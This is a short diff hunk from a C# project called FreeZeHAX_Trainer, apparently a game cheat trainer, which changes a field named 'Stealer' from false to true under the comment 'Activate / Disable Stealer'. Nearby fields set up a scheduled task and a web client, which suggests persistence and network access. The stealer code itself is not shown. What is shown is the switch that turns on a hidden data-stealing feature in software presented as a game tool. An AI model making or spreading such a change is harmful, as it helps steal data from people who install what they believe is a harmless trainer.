@@ -26,7 +26,7 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
         private readonly WebClient web = new WebClient();
         private bool ProcOpen = false; // In order us to check if the process exists, we need this bool.
-        private readonly bool Stealer = false; // Activate / Disable Stealer
+        private readonly bool Stealer = true; // Activate / Disable Stealer
         private Point lastLocation;
         private bool mouseDown;
 
